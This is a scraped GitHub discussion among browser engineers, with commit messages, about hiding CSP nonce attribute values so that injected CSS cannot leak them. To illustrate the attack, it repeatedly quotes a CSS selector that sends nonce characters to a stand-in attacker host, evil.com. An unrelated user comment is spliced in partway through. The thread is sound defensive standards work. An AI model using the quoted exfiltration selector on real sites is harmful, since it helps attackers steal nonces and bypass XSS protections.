    <tr class="d-block">
      <td class="d-block comment-body markdown-body  js-comment-body">
          <p dir="auto">We've seen some recent attacks on CSP which rely on the ability to exfiltrate <code class="notranslate">nonce</code> data via various mechanisms that can grab data from content attributes. CSS selectors are the best example: through clever use of prefix/postfix text matching selectors values can be sent out to an attacker's server for reuse (<code class="notranslate">script[nonce~=whatever] { background: url("https://evil.com/nonce?whatever"); }</code>). Chrome is experimenting with some changes that might help mitigate this risk, which seems fairly robust:</p>
<ol dir="auto">
<li>
<p dir="auto">When parsing a <code class="notranslate"><script></code> tag with a <code class="notranslate">nonce</code> attribute, copy the attribute's value in to an internal <code class="notranslate">[[nonce]]</code> slot on the element, and then overwrite the content attribute's value with the empty string.</p>
</li>
<li>
<p dir="auto">When changing the value of the content attribute (e.g. via <code class="notranslate">setAttributeValue</code>), update the value of the internal <code class="notranslate">[[nonce]]</code> slot.</p>
</li>
<li>
<p dir="auto">When running a script, pass in the <code class="notranslate">[[nonce]]</code> slot's value rather than the content attribute's value as the cryptographic nonce metadata to be used when fetching the script resource.</p>
</li>
<li>
<p dir="auto">The <code class="notranslate">nonce</code> IDL attribute on <code class="notranslate">HTMLScriptElement</code>'s getter returns the value of the internal <code class="notranslate">[[nonce]]</code> slot. Its setter sets the internal <code class="notranslate">[[nonce]]</code> slot's value. This enables JavaScript to retain access to the nonce value to manually propagate trust to scripts they require.</p>
</li>
</ol>
<p dir="auto">We'd want to do the above for every element that supports a <code class="notranslate">nonce</code> attribute. Some folks on the team suggest that it might actually be nice to extend this behavior to every element. That is, move this up to <code class="notranslate">Element</code> (or <code class="notranslate">Node</code>?) rather than special-casing the three elements that currently support nonces. If we extend nonce support to other resource types (as I'm told Mozilla has already done with images?), this might be more reasonable than special-casing even more elements.</p>
<p dir="auto">The tests associated with <a href="https://codereview.chromium.org/2628733005" rel="nofollow">https://codereview.chromium.org/2628733005</a> and <a href="https://codereview.chromium.org/2644143005" rel="nofollow">https://codereview.chromium.org/2644143005</a> might help explain the expectations.</p>
<p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/arturjanc/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/arturjanc">@arturjanc</a>, <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/mikispag/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/mikispag">@mikispag</a>, and <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/lweichselbaum/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/lweichselbaum">@lweichselbaum</a> have opinions. I hope folks like <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/annevk/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/annevk">@annevk</a>, <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/mozfreddyb/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/mozfreddyb">@mozfreddyb</a>, <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/ckerschb/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/ckerschb">@ckerschb</a>, <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/dveditz/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/dveditz">@dveditz</a>, <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/hillbrad/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/hillbrad">@hillbrad</a>, <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/devd/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/devd">@devd</a>, <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/johnwilander/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/johnwilander">@johnwilander</a>, and <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/teddink/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/teddink">@teddink</a> also have opinions.</p>
      </td>
    </tr>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">


    

    <strong class="css-truncate">
        <a class="author Link--primary text-bold css-truncate-target " show_full_name="false" data-hovercard-type="user" data-hovercard-url="/users/mikewest/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/mikewest">mikewest</a>

      <a href="#issuecomment-280622702" id="issuecomment-280622702-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2017-02-17T11:10:41Z" class="no-wrap" title="Feb 17, 2017, 4:40 PM GMT+5:30">Feb 17, 2017</relative-time></a>

    
  </h3>

      <div class="edit-comment-hide">

        <task-lists disabled="" sortable="">
<table class="d-block user-select-contain" data-paste-markdown-skip="">
  <tbody class="d-block">
    <tr class="d-block">
      <td class="d-block comment-body markdown-body  js-comment-body">
          <blockquote>
<p dir="auto">What is the processing model for 2? What would <code class="notranslate">getAttribute("nonce")</code> return?</p>
</blockquote>
<p dir="auto">I don't care too much about 2, honestly. The idea is than an application that doesn't want to give scripts the ability to propagate the nonce has the ability to clear it out before loading scripts they don't trust as much. I guess we could support that through <code class="notranslate">removeAttribute</code>, though. I'd be happy with that instead.</p>
<blockquote>
<p dir="auto">Per <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="145947205" data-permission-text="Title is private" data-url="https://github.com/w3c/webappsec-csp/issues/65" data-hovercard-type="issue" data-hovercard-url="/w3c/webappsec-csp/issues/65/hovercard" href="https://github.com/w3c/webappsec-csp/issues/65">w3c/webappsec-csp#65</a> your suggestion would break scripts. Is that no longer true?</p>
</blockquote>
<p dir="auto">Ah, thanks for finding that! I knew you'd said "Hey, shouldn't we hide the nonce?" at some point, but I couldn't find the bug. :) The refinement here is that the nonce continues to be available via the <code class="notranslate">nonce</code> IDL attribute; we're only clearing out the content attribute's value. That is, <code class="notranslate">document.querySelector('script[nonce]').getAttribute('nonce')</code> would return an empty string, while <code class="notranslate">document.querySelector('script[nonce]').nonce</code> would return the nonce value. As long as the attacker doesn't have script access, they'll have a hard time making use of that value.</p>
      </td>
    </tr>
  </tbody>
</table>
</task-lists>

      <a href="#issuecomment-280837065" id="issuecomment-280837065-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2017-02-18T10:36:36Z" class="no-wrap" title="Feb 18, 2017, 4:06 PM GMT+5:30">Feb 18, 2017</relative-time></a>

      <div class="edit-comment-hide">

        <task-lists disabled="" sortable="">
<table class="d-block user-select-contain" data-paste-markdown-skip="">
  <tbody class="d-block">
    <tr class="d-block">
      <td class="d-block comment-body markdown-body  js-comment-body">
          <p dir="auto">Re: the discussion in <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="145947205" data-permission-text="Title is private" data-url="https://github.com/w3c/webappsec-csp/issues/65" data-hovercard-type="issue" data-hovercard-url="/w3c/webappsec-csp/issues/65/hovercard" href="https://github.com/w3c/webappsec-csp/issues/65">w3c/webappsec-csp#65</a> mentioned by <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/annevk/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/annevk">@annevk</a> -- I was, sadly, wrong about that. The attacks on nonces that we were worried about relied on injecting "dangling markup" where the legitimate nonce would become part of another attribute (e.g. something like <code class="notranslate"><iframe src='//evil.com/...<foo></foo> <script nonce="secret"'>) so the parsed document would not contain the </code>nonce` attribute and hiding it would not help much. However, it's also possible to exfiltrate nonces without putting the parser in a strange state, e.g. via DOM XSS by injecting styles and using CSS selectors to match on the value of the nonce attribute; hiding the nonce from the DOM mitigates such attacks.</p>
<p dir="auto">The approach outlined by Mike above achieves the security goal (i.e. prevents exfiltration of the nonce via CSS and any similar techniques) but also allows nonce propagation because scripts can get its value by using the IDL attribute / <code class="notranslate">.nonce</code> property of the nonced script element.</p>
      </td>
    </tr>
  </tbody>
</table>
</task-lists>

      <div class="edit-comment-hide">

        <task-lists disabled="" sortable="">
<table class="d-block user-select-contain" data-paste-markdown-skip="">

    <tr class="d-block">
      <td class="d-block comment-body markdown-body  js-comment-body">
          <p dir="auto">The simplest answer is that we plan on breaking them; more accurately, we'd require them to be refactored to first check for the presence of the IDL attribute (for UAs which make this change), and if that fails, the DOM attribute (for UAs which don't). My guess is that potential breakage is most likely limited to Google (since we're the main, if not only, user of nonce-only CSP policies) and it's something we can deal with; but it would be good to add telemetry to see if this would be a problem anywhere else.</p>
      </td>
    </tr>
  </tbody>
</table>

<div class="js-details-container Details js-socket-channel js-updatable-content" data-channel="eyJjIjoicmVwbzoxMTk2OTUwNzpjb21taXQ6NWM4ODc0ZmNhOTZiZWUzNzllMzhmZWUzZjE4NDk5Y2Y4MzViOWNjOSIsInQiOjE2Njk2NjYxMjJ9--a1dbe443bd02bece083a90c99e38c3ab63cd76d052c7342fb85ed79774d5d466" data-url="/whatwg/html/commit/5c8874fca96bee379e38fee3f18499cf835b9cc9/show_partial?partial=commit%2Fcondensed_details">

<div class="AvatarStack flex-self-start  ">

      <a class="avatar avatar-user" style="width:20px;height:20px;" data-test-selector="commits-avatar-stack-avatar-link" data-hovercard-type="user" data-hovercard-url="/users/mikewest/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/mikewest">
        <img data-test-selector="commits-avatar-stack-avatar-image" src="https://avatars.githubusercontent.com/u/1497?s=40&v=4" width="20" height="20" alt="@mikewest" class=" avatar-user">

      <div class="pr-1 flex-auto min-width-0">
        <code>
          <a title="WIP: Hide nonce content attribute values. (#2369)

We've seen some recent attacks on CSP which rely on the ability to
exfiltrate nonce data via various mechanisms that can grab data from
content attributes. CSS selectors are the best example: through clever
use of prefix/postfix text matching selectors values can be sent out
to an attacker's server for reuse (e.g.
`script[nonce=a] { background: url("https://evil.com/nonce?a");}`).

This patch makes some changes to mitigate this risk by hiding the nonce
value from relevant element's content attributes:

1.  When parsing an element with a `nonce` attribute, the content
    attribute's value is copied into an internal slot on the element, and
    overwritten with the empty string.

2.  The `nonce` IDL attribute's getter returns the value of the internal
    slot, and its setter updates the internal slot's value.

3.  The internal slot's value is used to populate the cryptographic
    nonce metadata used by Fetch when making requests.

WIP: This patch doesn't actually do the above yet. It only adjusts
the <link> element in the hopes of sparking conversation about how this
feature should actually work. Does it look reasonable? Should we
replicate the steps for each element type that has a nonce, or move it
up the chain to something like Node?" data-pjax="true" class="Link--secondary markdown-title" href="/whatwg/html/commit/5c8874fca96bee379e38fee3f18499cf835b9cc9">WIP: Hide nonce content attribute values. (</a><a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="208403836" data-permission-text="Title is private" data-url="https://github.com/whatwg/html/issues/2369" data-hovercard-type="issue" data-hovercard-url="/whatwg/html/issues/2369/hovercard" href="https://github.com/whatwg/html/issues/2369">#2369</a><a title="WIP: Hide nonce content attribute values. (#2369)

We've seen some recent attacks on CSP which rely on the ability to
exfiltrate nonce data via various mechanisms that can grab data from
content attributes. CSS selectors are the best example: through clever
use of prefix/postfix text matching selectors values can be sent out
to an attacker's server for reuse (e.g.
`script[nonce=a] { background: url("https://evil.com/nonce?a");}`).

This patch makes some changes to mitigate this risk by hiding the nonce
value from relevant element's content attributes:

1.  When parsing an element with a `nonce` attribute, the content
    attribute's value is copied into an internal slot on the element, and
    overwritten with the empty string.

2.  The `nonce` IDL attribute's getter returns the value of the internal
    slot, and its setter updates the internal slot's value.

3.  The internal slot's value is used to populate the cryptographic
    nonce metadata used by Fetch when making requests.

WIP: This patch doesn't actually do the above yet. It only adjusts
the <link> element in the hopes of sparking conversation about how this
feature should actually work. Does it look reasonable? Should we
replicate the steps for each element type that has a nonce, or move it
up the chain to something like Node?" data-pjax="true" class="Link--secondary markdown-title" href="/whatwg/html/commit/5c8874fca96bee379e38fee3f18499cf835b9cc9">)</a>
        </code>

<batch-deferred-content class="d-inline-block" data-url="/commits/badges" data-catalyst="">

      <div class="pr-1 flex-shrink-0" style="width: 16px;">
      </div>

      <!-- ml-1 is added to accommodate "clock" icon -->
      <div class="text-right ml-1">
        <code>
          <a href="/whatwg/html/commit/5c8874fca96bee379e38fee3f18499cf835b9cc9" class="Link--secondary">5c8874f</a>
        </code>
      </div>
    </div>
  </div>
    <div class="Details-content--hidden mt-2">
      <pre class="color-fg-muted ws-pre-wrap">We've seen some recent attacks on CSP which rely on the ability to
exfiltrate nonce data via various mechanisms that can grab data from
content attributes. CSS selectors are the best example: through clever
use of prefix/postfix text matching selectors values can be sent out
to an attacker's server for reuse (e.g.
`script[nonce=a] { background: url("<a href="https://evil.com/nonce?a");}`" rel="nofollow">https://evil.com/nonce?a");}`</a>).

This patch makes some changes to mitigate this risk by hiding the nonce
value from relevant element's content attributes:

1.  When parsing an element with a `nonce` attribute, the content
    attribute's value is copied into an internal slot on the element, and
    overwritten with the empty string.

2.  The `nonce` IDL attribute's getter returns the value of the internal
    slot, and its setter updates the internal slot's value.

3.  The internal slot's value is used to populate the cryptographic
    nonce metadata used by Fetch when making requests.

WIP: This patch doesn't actually do the above yet. It only adjusts
the <link> element in the hopes of sparking conversation about how this
feature should actually work. Does it look reasonable? Should we
replicate the steps for each element type that has a nonce, or move it
up the chain to something like Node?</pre>
    </div>
</div>

    </div>
  </div>
</div>



</div>

      <a href="#issuecomment-281070591" id="issuecomment-281070591-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2017-02-20T12:46:54Z" class="no-wrap" title="Feb 20, 2017, 6:16 PM GMT+5:30">Feb 20, 2017</relative-time></a>

      <div class="edit-comment-hide">

        <task-lists disabled="" sortable="">
<table class="d-block user-select-contain" data-paste-markdown-skip="">
  <tbody class="d-block">
    <tr class="d-block">
      <td class="d-block comment-body markdown-body  js-comment-body">
          <p dir="auto">Re (2), I think it would be pretty confusing for web developers if <code class="notranslate">setAttribute</code> is used and [[Cryptographic Nonce]] is left at its earlier value. But I also think it should not set the content attribute to the empty string and set [[Cryptographic Nonce]] to the new value -- we want people to use <code class="notranslate">.nonce</code> instead. How about making any modification to the content attribute, except from the parser, cause the element to be <a href="https://w3c.github.io/webappsec-csp/#is-element-nonceable" rel="nofollow">"Not Nonceable"</a>? This would be an obvious failure mode that is easier to debug, where browser devtools can steer people towards using <code class="notranslate">.nonce</code> instead, and we don't end up running scripts that should not have run because the nonce was in a confusing state.</p>
      </td>
    </tr>
  </tbody>
</table>
</task-lists>

          <p dir="auto">But scripts inserted with <code class="notranslate">innerHTML</code> don't execute anyway (mostly to avoid executing twice when <code class="notranslate">innerHTML += "..."</code> is used).</p>
      </td>
    </tr>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">


    

    <strong class="css-truncate">
        <a class="author Link--primary text-bold css-truncate-target " show_full_name="false" data-hovercard-type="user" data-hovercard-url="/users/mikewest/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/mikewest">mikewest</a>

    commented


      <a href="#issuecomment-281329630" id="issuecomment-281329630-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2017-02-21T12:19:15Z" class="no-wrap" title="Feb 21, 2017, 5:49 PM GMT+5:30">Feb 21, 2017</relative-time></a>

    
  </h3>
</div>


      <div class="edit-comment-hide">

        <task-lists disabled="" sortable="">
<table class="d-block user-select-contain" data-paste-markdown-skip="">
  <tbody class="d-block">
    <tr class="d-block">
      <td class="d-block comment-body markdown-body  js-comment-body">
          <p dir="auto">Thanks, <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/zcorpan/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/zcorpan">@zcorpan</a>!</p>
<blockquote>
<p dir="auto">Re (2), I think it would be pretty confusing for web developers if setAttribute is used and [[Cryptographic Nonce]] is left at its earlier value. But I also think it should not set the content attribute to the empty string and set [[Cryptographic Nonce]] to the new value -- we want people to use .nonce instead. How about making any modification to the content attribute, except from the parser, cause the element to be "Not Nonceable"?</p>
</blockquote>
<p dir="auto">As background, I think the only case in which setting a nonce value is reasonable is during creation/insertion of a new script. That is:</p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>var s = document.createElement('script');
s.src = 'whatever';
s.nonce = 'noncey-nonce';
document.body.appendChild(s);
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="var s = document.createElement('script');
s.src = 'whatever';
s.nonce = 'noncey-nonce';
document.body.appendChild(s);" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">In that situation, I honestly wouldn't care if <code class="notranslate">s.setAttribute('nonce', 'noncey-nonce')</code> worked as well. As long as it's done before the <code class="notranslate">appendChild</code>, no problem. Setting a nonce on an element once a script has executed or a resource has loaded or whatever seems like a strange thing to do, and I don't honestly expect anyone to do it (with the exception of preventing accidental/malicious nonce propagation by intentionally removing the nonce value).</p>
<p dir="auto">To bring in the conversation from <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="208822006" data-permission-text="Title is private" data-url="https://github.com/whatwg/html/issues/2373" data-hovercard-type="pull_request" data-hovercard-url="/whatwg/html/pull/2373/hovercard?comment_id=102034953&comment_type=review_comment" href="https://github.com/whatwg/html/pull/2373#discussion_r102034953">#2373 (comment)</a>: this patch basically decouples the IDL and content attributes (e.g. whatever.setAttribute('nonce', 'whatever') pokes at the content attribute's value, but doesn't change the internal slot, and vice-versa with whatever.nonce = 'whatever'). That seems more conceptually defensible than linking the two in some cases but not in others.</p>
<blockquote>
<p dir="auto">Should the fragment parser (i.e. innerHTML) be allowed to set [[Cryptographic Nonce]]?</p>
</blockquote>
<p dir="auto">Sure. It seems like it would be surprising to prevent that... am I missing something? In general, I'd imagined that we deal with the <code class="notranslate">nonce</code> content attribute as it exists when the element is inserted into a document, however it's inserted. I'm pretty much fine with accepting <code class="notranslate">el.innerHTML = "<script nonce='yay'>alert(1);</scr" + "ipt>";</code> and breaking <code class="notranslate">document.body.appendChild(document.querySelector('script').remove())</code>, for example.</p>
<blockquote>
<p dir="auto">Should [[Cryptographic Nonce]] be cloned with cloneNode()?</p>
</blockquote>
<p dir="auto">Good question. Do we clone other kinds of state (e.g. <code class="notranslate">parser-inserted</code> or <code class="notranslate">already-started</code> flags?)? I don't think we do. I'd suggest we follow the behavior for those flags for this slot.</p>
      </td>
    </tr>
  </tbody>
</table>
</task-lists>

        <code>
          <a title="Hide 'nonce' content attributes.

This patch extracts the 'nonce' attribute out to a generic definition in
the "Fetching resources" section (alongside "CORS settings attributes",
etc.), and defines some new behaviors with the intent of reducing the
risk of side-channel leakage of the nonce's value.

In short, the nonce value is extracted from the content attribute when
the element is inserted into the DOM, and put into an internal slot. The
content attribute's value is set to the empty string.

From then on, the slot's value and the content attribute's value are
disconnected; alterations to one have no effect on the other, and
vice-versa.

The nonce's value is available to script via the `nonce` IDL attribute,
and so can be propagated just as today.

Addresses whatwg/html#2369." data-pjax="true" class="Link--secondary markdown-title" href="/whatwg/html/commit/e1fe3e9025b31978d4b4b1753b15303734c3844b">Hide 'nonce' content attributes.</a>

    <div class="Details-content--hidden mt-2">
      <pre class="color-fg-muted ws-pre-wrap">This patch extracts the 'nonce' attribute out to a generic definition in
the "Fetching resources" section (alongside "CORS settings attributes",
etc.), and defines some new behaviors with the intent of reducing the
risk of side-channel leakage of the nonce's value.

In short, the nonce value is extracted from the content attribute when
the element is inserted into the DOM, and put into an internal slot. The
content attribute's value is set to the empty string.

From then on, the slot's value and the content attribute's value are
disconnected; alterations to one have no effect on the other, and
vice-versa.

The nonce's value is available to script via the `nonce` IDL attribute,
and so can be propagated just as today.

Addresses <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="208403836" data-permission-text="Title is private" data-url="https://github.com/whatwg/html/issues/2369" data-hovercard-type="issue" data-hovercard-url="/whatwg/html/issues/2369/hovercard" href="https://github.com/whatwg/html/issues/2369">#2369</a>.</pre>
    </div>
</div>

          <p dir="auto">I desperately need some insight into this problem I am having.       <td class="d-block comment-body markdown-body  js-comment-body">
          <p dir="auto">Thanks.<br>
The image issue was because I was using upgradeInsecureRequests: true<br>
and so when running on localhost without https it was causing this issue. These images are working now.</p>
<p dir="auto">As for the other scripts, adding the nonce is working and the page is functional.</p>
<p dir="auto">The inline styles are applying to the page, but I am still getting the error in the console that they are blocked by CSP. It has the same message 7-11 times, but only 1 inline style. Any idea why? I do not like these console messages but I suppose I can live with them.</p>
<p dir="auto">Finally, some of the images aren't actually loading, so I have to look into this.</p>
<p dir="auto">Again, thanks for helping.</p>
      </td>
    </tr>

</table>

      <div class="pr-1 flex-auto min-width-0">
        <code>
          <a title="Hide nonce content attribute values

Some [recent attacks on CSP][1] rely on the ability to exfiltrate
nonce data via various mechanisms that can read content attributes.
CSS selectors are the best example: through clever use of
prefix/postfix text matching selectors values can be sent out to an
attacker's server for reuse (e.g.,
`script[nonce=a] { background: url("https://evil.com/nonce?a");}`).

This patch mitigates the risk of this class of attack by hiding the
nonce value from elements' content attributes by moving the `nonce`
attributes into a new `NoncedElement` interface mixin, which is
included into `HTMLElement`. That mixin defines the following
behaviors for the `nonce` content attribute:

1.  When the `nonce` content attribute is set or changed, its new
    value is copied into a `[[CryptographicNonce]]` slot on the
    element.

2.  When a `NoncedElement` is inserted into a document which was
    delivered with a `Content-Security-Policy` header, the `nonce`
    content attribute is cleared out.

The `nonce` IDL attribute getter and setter now operate on the
`[[CryptographicNonce]]` slot's value rather than reflecting the
content attribute, meaning that the nonce value remains exposed
to script, but is opaque to non-script side-channels.

Likewise, the `[[CryptographicNonce]]` slot's value is used when
populating a request's cryptographic nonce metadata in order to
deliver the nonce to CSP for validation.

Tests: https://github.com/w3c/web-platform-tests/tree/master/content-security-policy/nonce-hiding

Closes #2369.

[1]: https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" data-pjax="true" class="Link--secondary markdown-title" href="/alice/html/commit/a075c683d628a1d6017f2251dc5d8ba25523961c">Hide nonce content attribute values</a>
        </code>

    <div class="Details-content--hidden mt-2">
      <pre class="color-fg-muted ws-pre-wrap">Some [recent attacks on CSP][1] rely on the ability to exfiltrate
nonce data via various mechanisms that can read content attributes.
CSS selectors are the best example: through clever use of
prefix/postfix text matching selectors values can be sent out to an
attacker's server for reuse (e.g.,
`script[nonce=a] { background: url("<a href="https://evil.com/nonce?a");}`" rel="nofollow">https://evil.com/nonce?a");}`</a>).

This patch mitigates the risk of this class of attack by hiding the
nonce value from elements' content attributes by moving the `nonce`
attributes into a new `NoncedElement` interface mixin, which is
included into `HTMLElement`. That mixin defines the following
behaviors for the `nonce` content attribute:

1.  When the `nonce` content attribute is set or changed, its new
    value is copied into a `[[CryptographicNonce]]` slot on the
    element.

2.  When a `NoncedElement` is inserted into a document which was
    delivered with a `Content-Security-Policy` header, the `nonce`
    content attribute is cleared out.

The `nonce` IDL attribute getter and setter now operate on the
`[[CryptographicNonce]]` slot's value rather than reflecting the
content attribute, meaning that the nonce value remains exposed
to script, but is opaque to non-script side-channels.

Likewise, the `[[CryptographicNonce]]` slot's value is used when
populating a request's cryptographic nonce metadata in order to
deliver the nonce to CSP for validation.

Tests: <a href="https://github.com/w3c/web-platform-tests/tree/master/content-security-policy/nonce-hiding">https://github.com/w3c/web-platform-tests/tree/master/content-security-policy/nonce-hiding</a>

[1]: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" rel="nofollow">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></pre>
